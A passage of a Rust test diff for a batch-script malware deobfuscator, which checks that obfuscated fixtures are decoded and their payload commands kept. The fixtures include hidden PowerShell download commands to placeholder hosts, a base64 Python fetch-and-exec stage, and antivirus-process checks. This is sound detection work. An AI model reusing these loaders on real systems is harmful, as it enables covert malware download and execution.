+            script.push_str(&format!("%setter%\"Fragment{idx:03}Token={value}\"\r\n"));
+        }
+        for idx in 1..=64 {
+            script.push_str(&format!("%Fragment{idx:03}Token%"));
+        }
+        script.push_str("\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("-NoProfile -Command"),
+            "renamed PowerShell command line was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("%~nx0.exe"),
+            "renamed executable prefix was dropped from the command line:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains("rem omitted long unresolved percent-noise line"),
+            "renamed PowerShell command was summarized before preservation:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn materialized_percent_noise_expands_doubled_substring_refs() {
+        let mut env = crate::Environment::new(&Config::default());
+        env.set("PUBLIC", r"C:\Users\Public");
+        env.set("PROGRAMFILES(X86)", r"C:\Program Files (x86)");
+        assert_eq!(
+            crate::expand_fast_percent_noise_ref(
+                "PUBLIC:~11,                                1",
+                &env
+            )
+            .as_deref(),
+            Some("b")
+        );
+        assert_eq!(
+            crate::expand_fast_percent_noise_ref(
+                "PROGRAMFILES(X86):~18,                                1",
+                &env
+            )
+            .as_deref(),
+            Some("x")
+        );
+        let line = format!(
+            "powershell -nop -c \"Write-Output {}\"",
+            "%%PUBLIC:~11,                                1%%m%%%PROGRAMFILES(X86):~18,                                1%%n%"
+                .repeat(6)
+        );
+
+        let materialized = crate::materialized_percent_noise_action_line(&line, &env)
+            .expect("doubled substring refs should materialize");
+
+        assert!(
+            materialized.contains("Write-Output bxbxbxbxbxbx"),
+            "doubled substring refs were not expanded: {materialized}"
+        );
+        assert!(
+            !materialized.contains("PUBLIC:~"),
+            "doubled substring ref text leaked: {materialized}"
+        );
+    }
+
+    #[test]
+    fn preconsume_materialized_percent_substr_sets_seeds_unicode_dictionary() {
+        let mut env = crate::Environment::new(&Config::default());
+        env.set("K", "set");
+        env.set("字典", "abcdef");
+        assert_eq!(
+            crate::expand_fast_percent_noise_ref("字典:~5,1", &env).as_deref(),
+            Some("f")
+        );
+        let value_chain = "%字典:~5,1%%字典:~4,1%%字典:~3,1%".repeat(16);
+        let script = format!("exit\r\n%K:~0,1%%K:~1,1%%K:~2,1% \"下个={value_chain}\"\r\n");
+        let materialized_line = script.lines().nth(1).expect("derived set line");
+        let materialized = crate::materialized_percent_noise_action_line(materialized_line, &env)
+            .expect("derived set line should materialize");
+        assert!(
+            materialized.starts_with("set \"下个=fed"),
+            "unexpected materialized set: {materialized}"
+        );
+
+        crate::preconsume_materialized_percent_substr_sets_before_percent_noise_summary(
+            &script, &mut env,
+        );
+
+        let expected = "fed".repeat(16);
+        assert_eq!(env.get("下个").as_deref(), Some(expected.as_str()));
+    }
+
+    #[test]
+    fn skipped_percent_wrapped_single_char_dictionary_still_feeds_payload() {
+        let noisy_set = "%NoiseA%s%NoiseB%%NoiseC%e%NoiseD%%NoiseE%t%NoiseF% \"%NoiseG%u%NoiseH%=%NoiseI%s%NoiseJ%\"";
+        let noisy_for_set = "%NoiseA%f%NoiseB%%NoiseC%o%NoiseD%%NoiseE%r%NoiseF% /l %%z  %NoiseK%i%NoiseL%n%NoiseM% (1, 1, 1) do ( %NoiseN%s%NoiseO%%NoiseP%e%NoiseQ%%NoiseR%t%NoiseS% \"%NoiseT%v%NoiseU%=%NoiseV%t%NoiseW%\" )";
+        let pad = format!("rem {}\r\n", "padding".repeat(180));
+        let script = format!(
+            "@echo off\r\ngoto payload\r\n{pad}:dict\r\n{noisy_set}\r\n{noisy_for_set}\r\n:payload\r\n%u%%v%art /min powershell.exe -Command \"Write-Output ok\"\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("start /min powershell.exe"),
+            "skipped percent-wrapped dictionary did not seed payload command:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .lines()
+                .any(|line| line.trim_start().starts_with("tart /min powershell.exe")),
+            "payload command was rendered with missing dictionary letters:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn analyze_scans_python_base64_stage_in_cmd_child() {
+        let script = r#"cmd.exe /c start "" "C:\Users\Public\Downloads\xmetavip2\pw.exe" -c "import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8va2xpbmdwcmVtaXVtLnh5ei94bWV0YW9ubHl4d3JvbScpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykpKQ=='))"
+"#;
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://klingpremium.xyz/xmetaonlyxwrom"
+            )),
+            "Python base64 URL in cmd child was missed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn unresolved_materialized_percent_substr_command_is_summarized() {
+        let mut env = crate::Environment::new(&Config::default());
+        let mut line = String::new();
+        for idx in 1..=16 {
+            let name = format!("P{idx:02}{}", "NoisyMarker".repeat(4));
+            if idx == 1 {
+                env.set(&name, "start /min powershell.exe -Command \"");
+            } else if idx == 16 {
+                env.set(&name, "\"");
+            } else {
+                env.set(&name, ":~13,1:~46,1:~15,1:~23,1:~10,1:~37,1:~26,1:~50,1");
+            }
+            line.push('%');
+            line.push_str(&name);
+            line.push('%');
+        }
+
+        let summarized = crate::summarize_long_unresolved_percent_noise_lines(&line, &mut env);
+
+        assert!(
+            summarized.contains("rem omitted long unresolved percent-noise line"),
+            "substring-heavy unresolved command should be summarized:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains(":~13,1"),
+            "unresolved substring carrier leaked:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn dense_unresolved_substr_carrier_line_is_summarized_after_drive() {
+        let carrier = format!(
+            "{}%APPDATA:~14,1{}",
+            ":~13,1:~46,1:~15,1:~23,1:~10,1:~37,1:~26,1:~50,1".repeat(12),
+            ":~17,1:~26,1:~12,1:~12,1:~41,1:~51,1:~15,1:~58,1".repeat(12)
+        );
+        let script = format!(
+            "@echo off\r\nstart /min powershell.exe -WindowStyle Hidden -Command \"{carrier}\"\r\necho done\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted dense unresolved substring-fragment line"),
+            "dense unresolved carrier should be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(":~13,1"),
+            "unresolved substring carrier leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo done"),
+            "following command should remain visible:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn dense_unresolved_substr_prefix_keeps_quoted_powershell_payload() {
+        let payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://prefix-clean.example/p.zip', 'C:\\Users\\Public\\p.zip')";
+        let script = format!(
+            "@echo off\r\n@@If junk:~28,1:~44,1:~36,1:~21,1:~23,1:~27,1:~14,1:~5,1:~32,1:~12,1:~34,1:~9,1 \"{payload}\"\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("powershell.exe -WindowStyle Hidden -Command"),
+            "quoted PowerShell payload should be preserved as a command:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("prefix-clean.example/p.zip"),
+            "download payload missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("junk:~28,1"),
+            "unresolved prefix leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn materialized_actionable_percent_chain_keeps_powershell_base64_intact() {
+        let b64 =
+            "DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAf#ACQAZgBvAG8Af#ACQAYgBhAHIAIAAf#ACQAYgBhAHoA"
+                .repeat(12);
+        let mut env = crate::Environment::new(&Config::default());
+        env.set("P01", "powershell -Command \"$x='");
+        env.set("P02", &b64);
+        env.set(
+            "P03",
+            "';[Convert]::FromBase64String($x); Invoke-WebRequest https://keep-base64.example/p\"",
+        );
+        for idx in 4..=32 {
+            env.set(&format!("P{idx:02}"), " ");
+        }
+        let line = concat!(
+            "%P01%%P02%%P03%%P04%%P05%%P06%%P07%%P08%",
+            "%P09%%P10%%P11%%P12%%P13%%P14%%P15%%P16%",
+            "%P17%%P18%%P19%%P20%%P21%%P22%%P23%%P24%",
+            "%P25%%P26%%P27%%P28%%P29%%P30%%P31%%P32%",
+        );
+
+        let materialized = crate::materialized_percent_noise_action_line(line, &env)
+            .expect("actionable PowerShell chain should materialize");
+
+        assert!(
+            materialized.contains(&b64),
+            "PowerShell base64 was corrupted by marker stripping:\n{}",
+            materialized
+        );
+    }
+
+    #[test]
+    fn regex_replace_base64_powershell_concat_urls_are_extracted() {
+        use base64::Engine as _;
+
+        let decoded = concat!(
+            "$Bytes = 'http';",
+            "$Bytes2 = 's://';",
+            "$scheme = $Bytes + $Bytes2;",
+            "$links = @(($scheme + 'concat-one.example/a'),($scheme + 'concat-two.example/b'));",
+            "$imageBytes = DownloadDataFromLinks $links;"
+        );
+        let utf16: Vec<u8> = decoded.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let b64 = base64::engine::general_purpose::STANDARD
+            .encode(utf16)
+            .replace('r', "f#");
+        let script = format!(
+            "powershell -Command \"$ddsdfgo = ''{b64}'';$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([regex]::Replace($ddsdfgo, ''f#'', ''r'')));iex $s\"\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        for expected in [
+            "https://concat-one.example/a",
+            "https://concat-two.example/b",
+        ] {
+            assert!(
+                report.traits.iter().any(|trait_| matches!(
+                    trait_,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == expected && line_hint == "powershell-concat-url"
+                )),
+                "decoded concat URL {expected} missed: {:?}\ndeob:\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+    }
+
+    #[test]
+    fn adjacent_rendered_binary_noise_summaries_are_coalesced() {
+        let text = concat!(
+            "echo keep\r\n",
+            "rem omitted 9 residual binary-looking lines (309 bytes)\r\n",
+            "rem omitted 259 binary-looking lines (108452 bytes)\r\n",
+            "rem omitted 15 binary-looking lines (7574 bytes)\r\n",
+            "powershell -c \"Write-Host kept\"\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_binary_noise_summary_lines(text, &mut env)
+            .expect("adjacent binary summaries should coalesce");
+
+        assert!(
+            cleaned.contains("rem omitted 283 binary-looking lines (116335 bytes)"),
+            "coalesced binary summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo keep") && cleaned.contains("powershell -c"),
+            "real lines around summaries should remain:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            cleaned.matches("binary-looking lines").count(),
+            1,
+            "individual binary summaries leaked:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn dense_rendered_residual_binary_noise_is_summarized_across_fragments() {
+        let mut text = String::from("@echo off\r\n");
+        text.push_str("set payload=keep\r\n");
+        text.push_str("echo %payload% | powershell.exe -nop\r\n");
+        for idx in 0..48 {
+            text.push_str(&format!("{}\r\n", (b'A' + (idx % 26) as u8) as char));
+            text.push_str("rem omitted 2 residual binary-looking lines (10 bytes)\r\n");
+        }
+        text.push_str(
+            "7<ywFI[\x1dpZ\x151uzw4nb\x1bJ?5rzGnP\x1bHzF-%B75C7Y\tAT<\x011sWk\\\x13`Em\x02fL\r\n",
+        );
+        text.push_str("choice /d y /t 1\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::suppress_dense_rendered_residual_binary_noise_lines(&text, &mut env)
+            .expect("dense rendered residual binary noise should summarize");
+
+        assert!(
+            cleaned.contains("rem omitted 145 rendered residual binary-looking lines"),
+            "dense rendered residual binary summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("rem omitted 2 residual binary-looking lines"),
+            "individual residual binary summaries leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("7<ywFI["),
+            "long residual binary fragment leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo %payload% | powershell.exe") && cleaned.contains("choice /d y"),
+            "real commands were hidden:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn abobus_scaffold_is_summarized_without_hiding_payload_commands() {
+        let text = concat!(
+            "cls\r\n",
+            "@:ABOBUS-OBFUSCATOR\r\n",
+            " SET \"__author__=EscaLag\"\r\n",
+            " SET \"__github__=this was made f^oR alex\"\r\n",
+            " @set /a+=1 >NuL\r\n",
+            "fo)i IN (1 1 1) do foiuthorgi)thub__)do iF not dea exit\r\n",
+            "iF not deed illlllill exit\r\n",
+            "foR %%a IN ( illlllill _uthor__ __thub__)do iF not deed %%a exit\r\n",
+            "@set \"alphabet=fxD2THuBbASMlXhdWO@jc8mi4erQE3p=nvaNzwkLFPyRt7qoCGJYZ90UIg6sK V15\"\r\n",
+            "@echo>tmp\r\n",
+            "foR /f \"tokens=3\" %%i in ('type tmp')do if \"%%i\" EU \"on.\" (exit) else (del /f/q tmp)\r\n",
+            "@FO:~61,1:~5,1:~35,1:~16,1:~38,1:~43,1:~47,1:~50,1:~9,1\r\n",
+            "@If 1 EU 1 powershell.exe -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://abobus-doc.example/a.docx', 'C:\\Users\\Public\\a.docx')\"\r\n",
+            "@GARBAGE:~1,1:~2,1:~3,1:~4,1:~5,1:~6,1:~7,1:~8,1:~9,1\r\n",
+            "powershell.exe -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://abobus-zip.example/a.zip', 'C:\\Users\\Public\\a.zip')\"\r\n",
+            "@;@IF 1 EQU 1 powershell.exe -WindowStyle Hidden -Command \" C:\\Users\\Public\\Document\\pythonw.exe C:\\Users\\Public\\Document\\DLLs\\fr_2711.pd clickapp\"\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+
+        let cleaned = crate::summarize_abobus_obfuscator_scaffold_lines(text, &mut env)
+            .expect("Abobus scaffold should summarize");
+
+        assert!(
+            cleaned.contains("rem omitted 11 Abobus obfuscator scaffold lines"),
+            "Abobus scaffold summary missing:\n{}",
+            cleaned
+        );
+        for leaked in [
+            "ABOBUS-OBFUSCATOR",
+            "__author__",
+            "__github__",
+            "iF not deed",
+            "tokens=3",
+            "@FO:~61,1",
+            "@GARBAGE:~1,1",
+        ] {
+            assert!(
+                !cleaned.contains(leaked),
+                "scaffold leaked `{leaked}`:\n{}",
+                cleaned
+            );
+        }
+        for expected in [
+            "https://abobus-doc.example/a.docx",
+            "https://abobus-zip.example/a.zip",
+            "pythonw.exe C:\\Users\\Public\\Document\\DLLs\\fr_2711.pd clickapp",
+        ] {
+            assert!(
+                cleaned.contains(expected),
+                "payload command hidden `{expected}`:\n{}",
+                cleaned
+            );
+        }
+    }
+
+    #[test]
+    fn abobus_short_setup_and_alphabet_scaffold_is_summarized() {
+        let text = concat!(
+            "st iliilll=script.bat\r\n",
+            "set marker=keep\r\n",
+            "set 𝧽= \u{1b}c\r\n",
+            "@st /a+=1 >NuL\r\n",
+            "; ;@set \"alphabet=juT =@hlgcRqt97v2Y5Wd6AXmsb4efSkZBE0oDwL8yVQMrHO3UFCnaIpi1KJxPNzG\"\r\n",
+            "@@IF  NEQ 2 exit\r\n",
+            "if n%oINed b (@echo =D\r\n",
+            "powershell.exe -WindowStyle Hidden -Command \"Write-Host keep\"\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+
+        let cleaned = crate::summarize_abobus_obfuscator_scaffold_lines(text, &mut env)
+            .expect("Abobus short setup scaffold should summarize");
+
+        for leaked in [
+            "st iliilll=script.bat",
+            "set 𝧽=",
+            "@st /a+=",
+            "juT =@hlgc",
+            "NEQ 2 exit",
+            "n%oINed b",
+        ] {
+            assert!(
+                !cleaned.contains(leaked),
+                "short scaffold leaked `{leaked}`:\n{}",
+                cleaned
+            );
+        }
+        for expected in [
+            "set marker=keep",
+            "powershell.exe -WindowStyle Hidden -Command \"Write-Host keep\"",
+        ] {
+            assert!(
+                cleaned.contains(expected),
+                "non-scaffold line hidden `{expected}`:\n{}",
+                cleaned
+            );
+        }
+    }
+
+    #[test]
+    fn rouki_damaged_setup_fragments_are_summarized() {
+        let text = concat!(
+            "(@chcpm 437)>nul\r\n",
+            "@ech)f)f\r\n",
+            "set lllililii0\r\n",
+            ":Rouki-OBFUSCATOR\r\n",
+            "eho>tmp\r\n",
+            "if  NEq 2 ext\r\n",
+            "cl)s\r\n",
+            "@e%o of\r\n",
+            "@echo off\r\n",
+            "powershell.exe -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://rouki.example/payload.zip', 'C:\\Users\\Public\\payload.zip')\"\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+
+        let cleaned = crate::summarize_abobus_obfuscator_scaffold_lines(text, &mut env)
+            .expect("Rouki scaffold should summarize");
+
+        for leaked in [
+            "(@chcpm 437)>nul",
+            "@ech)f)f",
+            "set lllililii0",
+            ":Rouki-OBFUSCATOR",
+            "eho>tmp",
+            "NEq 2 ext",
+            "cl)s",
+            "@e%o of",
+        ] {
+            assert!(
+                !cleaned.contains(leaked),
+                "Rouki setup fragment leaked `{leaked}`:\n{}",
+                cleaned
+            );
+        }
+        for expected in [
+            "@echo off",
+            "https://rouki.example/payload.zip",
+            "rem omitted",
+        ] {
+            assert!(
+                cleaned.contains(expected),
+                "expected content missing `{expected}`:\n{}",
+                cleaned
+            );
+        }
+    }
+
+    #[test]
+    fn abobus_damaged_prelude_fragments_are_summarized_without_hiding_payload() {
+        let text = concat!(
+            "@:ABOBUS-OBFUSCATOR\r\n",
+            "@@e)c%ff\r\n",
+            "fi iN (1 1 1)do (fi iN (1,1,1)do (If  EQxi)t))\r\n",
+            "for /l 1 iN (1,1,1)do (If %ErroRLeVel% EQU 0 et)\r\n",
+            "@@(@chcp)com 437)>Nul\r\n",
+            "siliil0\r\n",
+            " @set b=1 >nUl 2>&1\r\n",
+            " @;@@iF 49 EQnoiseU 0 (@exit) else @echo off\r\n",
+            "FoR /l %%i In (1 1 1)dO (FoR /l %%i In (1 1 1)dO (IF %ErrOrLEvel% EU 0 et))\r\n",
+            "@@IF  NEQ 2 e)xt\r\n",
+            "f)o)o)i in (1,1,1)Do (IF  EQt))\r\n",
+            "FOr %%a IN ( st ge )Do @fINdLiLIiliilll\r\n",
+            "e%xit\r\n",
+            " @@if  NEit\r\n",
+            " @@eho off\r\n",
+            "FOr /l %%i iN (1 1 1)dO (FOr /l %%i iN (1,1,1)dO (if %ErRorLevel% Eit))\r\n",
+            "@echff\r\n",
+            "powershell.exe -WindowStyle Hidden -Command \"$wc=New-Object Net.WebClient; $wc.DownloadFile('https://abobus.example/py3.8.zip', 'C:\\Users\\puncher\\AppData\\Roaming\\Microsoft\\3.8\\py3.8.zip')\"\r\n",
+            "powershell -c \"[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\puncher\\AppData\\Roaming\\Microsoft\\3.8\\py3.8.zip', 'C:\\Users\\puncher\\AppData\\Roaming\\Microsoft\\3.8\\');\"\r\n",
+            "C:\\Users\\puncher\\AppData\\Roaming\\Microsoft\\3.8\\WPy64-38100\\python-3.8.10.amd64\\python.exe -m venv env\r\n",
+            "call env\\Scripts\\activate\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+
+        let cleaned = crate::summarize_abobus_obfuscator_scaffold_lines(text, &mut env)
+            .expect("Abobus damaged prelude should summarize");
+
+        for leaked in [
+            "@:ABOBUS-OBFUSCATOR",
+            "@@e)c%ff",
+            "EQxi)t",
+            "%ErroRLeVel% EQU 0 et",
+            "chcp)com 437",
+            "siliil0",
+            "set b=1",
+            "EQnoiseU 0",
+            "%ErrOrLEvel% EU 0 et",
+            "NEQ 2 e)xt",
+            "IF  EQt",
+            "@fINdLiLIiliilll",
+            "e%xit",
+            "NEit",
+            "@@eho off",
+            "%ErRorLevel% Eit",
+            "@echff",
+        ] {
+            assert!(
+                !cleaned.contains(leaked),
+                "damaged prelude leaked `{leaked}`:\n{}",
+                cleaned
+            );
+        }
+        for expected in [
+            "https://abobus.example/py3.8.zip",
+            "ExtractToDirectory",
+            "python-3.8.10.amd64\\python.exe -m venv env",
+            "call env\\Scripts\\activate",
+        ] {
+            assert!(
+                cleaned.contains(expected),
+                "payload line hidden `{expected}`:\n{}",
+                cleaned
+            );
+        }
+    }
+
+    #[test]
+    fn abobus_scaffold_if_noise_does_not_emit_unresolved_trait() {
+        let script = br#"@:ABOBUS-OBFUSCATOR
+@@if NEit
+if n%oINed b (@echo =D
+if not deed illlllill exit
+if "%%i" EQU "on." (exit) else (del /f/q tmp)
+if errorlevel 1 echo MAYBE
+powershell.exe -WindowStyle Hidden -Command "Write-Host keep"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition } if condition == "NEit"
+            )),
+            "scaffold IF noise should not emit IfNotResolved: {:?}",
+            report.traits
+        );
+        for suppressed in [
+            "n%oINed b (@echo =D",
+            "deed illlllill exit",
+            "\"%%i\" EQU \"on.\" (exit) else (del /f/q tmp)",
+        ] {
+            assert!(
+                !report.traits.iter().any(|t| matches!(
+                    t,
+                    crate::traits::Trait::IfNotResolved { condition } if condition == suppressed
+                )),
+                "scaffold IF condition should not emit IfNotResolved `{suppressed}`: {:?}",
+                report.traits
+            );
+        }
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition }
+                    if condition == "errorlevel 1 echo MAYBE"
+            )),
+            "real dynamic IF should remain unresolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Write-Host keep"),
+            "payload command hidden:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn dense_interleaved_word_salad_lines_are_summarized_without_hiding_commands() {
+        let mut script = String::from("@echo off\r\nset Marker=X\r\n");
+        for idx in 0..48 {
+            script.push_str(&format!("AbcNoise{idx}-Harmless-Words-Only-Carrier-\r\n"));
+            if idx == 12 {
+                script.push_str("tasklist | findstr /I \"opssvc wrsa\"\r\n");
+            }
+            if idx == 24 {
+                script.push_str("cmd /c md 512069\r\n");
+            }
+            if idx == 36 {
+                script.push_str("<nul set /p =\"MZ\" > 512069\\Even.com\r\n");
+            }
+        }
+        script.push_str("start Even.com H\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 48 plain word-salad noise lines"),
+            "word-salad run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        for expected in [
+            "tasklist | findstr",
+            "cmd /c md 512069",
+            "<nul set /p =\"MZ\" > 512069\\Even.com",
+            "start Even.com H",
+        ] {
+            assert!(
+                report.deobfuscated.contains(expected),
+                "real command missing after word-salad cleanup ({expected}):\n{}",
+                report.deobfuscated
+            );
+        }
+        assert!(
+            !report.deobfuscated.contains("AbcNoise20-Harmless"),
+            "middle word-salad line leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn dense_isolated_word_salad_lines_are_summarized_without_hiding_set_lines() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..48 {
+            text.push_str(&format!("NoiseLine{idx}-Harmless-Words-Only-Carrier-\r\n"));
+            text.push_str(&format!("set \"Keep{idx:02}=X\"\r\n"));
+        }
+        text.push_str("tasklist | findstr /I \"opssvc wrsa\"\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_dense_plain_word_salad_lines(&text, &mut env)
+            .expect("dense isolated word-salad lines should summarize");
+
+        assert!(
+            cleaned.contains("rem omitted 48 plain word-salad noise lines"),
+            "dense isolated word-salad summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("NoiseLine20-Harmless"),
+            "isolated word-salad line leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("set \"Keep20=X\"") && cleaned.contains("tasklist | findstr"),
+            "set lines or real command were hidden:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn dense_parenthesized_word_salad_lines_are_summarized_without_hiding_commands() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..48 {
+            text.push_str(&format!("NoiseCarrier{idx}(\r\n"));
+            text.push_str(&format!("set \"Keep{idx:02}=X\"\r\n"));
+            if idx == 12 {
+                text.push_str("cmd /c md 701617\r\n");
+            }
+            if idx == 24 {
+                text.push_str("echo %Keep24%\r\n");
+            }
+        }
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_dense_plain_word_salad_lines(&text, &mut env)
+            .expect("dense parenthesized word-salad lines should summarize");
+
+        assert!(
+            cleaned.contains("rem omitted 48 plain word-salad noise lines"),
+            "parenthesized word-salad summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("NoiseCarrier20("),
+            "parenthesized word-salad line leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("set \"Keep20=X\"")
+                && cleaned.contains("cmd /c md 701617")
+                && cleaned.contains("echo %Keep24%"),
+            "set lines or real commands were hidden:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn dense_unknown_bare_command_noise_is_summarized_without_hiding_real_commands() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..80 {
+            text.push_str(&format!("BareNoise{idx}-\r\n"));
+            if idx == 20 {
+                text.push_str("tasklist | findstr /I \"opssvc wrsa\"\r\n");
+            }
+            if idx == 40 {
+                text.push_str("<nul set /p =\"MZ\" > 512069\\Even.com\r\n");
+            }
+            if idx == 60 {
+                text.push_str("start Even.com H\r\n");
+            }
+        }
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_dense_unknown_bare_command_noise_lines(&text, &mut env)
+            .expect("dense unknown bare command noise should summarize");
+
+        assert!(
+            cleaned.contains("rem omitted 80 unknown bare command noise lines"),
+            "unknown bare command summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("BareNoise20-"),
+            "unknown bare command noise leaked:\n{}",
+            cleaned
+        );
+        for expected in [
+            "tasklist | findstr",
+            "<nul set /p =\"MZ\" > 512069\\Even.com",
+            "start Even.com H",
+        ] {
+            assert!(
+                cleaned.contains(expected),
+                "real command missing ({expected}):\n{}",
+                cleaned
+            );
+        }
+    }
+
+    #[test]
+    fn dense_unresolved_substring_fragment_lines_are_summarized() {
+        let text = concat!(
+            "@echo off\r\n",
+            "@@if exiiilIlilllii:~1,1:~11,1:~37,1:~4,1:~60,1:~63,1:~62,1:~4,1:~2,1:~48,1:~6,1:~57,1,1\"[.riigr]::iytol[.cio]::\"\r\n",
+            "@if 87 LsS 149 \"rhtp://ww.b.//i/3hd/_iA_M__AD_S__2.oc?cclk&&1\"\r\n",
+            "@@if 1 E:~0,1:~2,1:~36,1:~60,1:~12,1:~64,1:~4,1:~4,1:~18,1:~42,1:~4,1:~54,1,1\"[et.evtagr]::Sco[.Stty]::1\"\r\n",
+            "start payload.exe\r\n",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_dense_unresolved_substring_fragment_lines(text, &mut env);
+
+        assert!(
+            cleaned.contains("dense unresolved substring-fragment"),
+            "substring-fragment summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(":~11,1:~37,1"),
+            "raw substring fragments leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("rhtp://ww.b.//i/3hd"),
+            "URL-like line should remain for review:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("start payload.exe"),
+            "real command should remain:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn normalized_cmd_echo_powershell_child_replaces_raw_wrapper_line() {
+        let script = concat!(
+            "@echo off\r\n",
+            "cmd.exe /c echo function Stage(){ Write-Host 'ok' } ^| powershell.exe -NoProfile > nul\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            !report
+                .deobfuscated
+                .to_ascii_lowercase()
+                .contains("cmd.exe /c echo function stage"),
+            "raw cmd echo wrapper leaked into final output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo function Stage(){ Write-Host 'ok' } | powershell.exe -NoProfile"),
+            "normalized child pipeline was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn adjacent_raw_cmd_echo_powershell_wrapper_is_coalesced() {
+        let raw = "cmd.exe /c echo function Stage(){\t$path='%~f0';\tWrite-Host 'ok' } | powershell.exe -NoProfile > nul\r\n";
+        let normalized =
+            "echo function Stage(){ $path='/tmp/sample.bat'; Write-Host 'ok' } | powershell.exe -NoProfile > nul\r\n";
+        let text = format!("@echo off\r\n{raw}{normalized}exit /b\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_cmd_echo_powershell_wrapper_lines(&text, &mut env);
+
+        assert!(
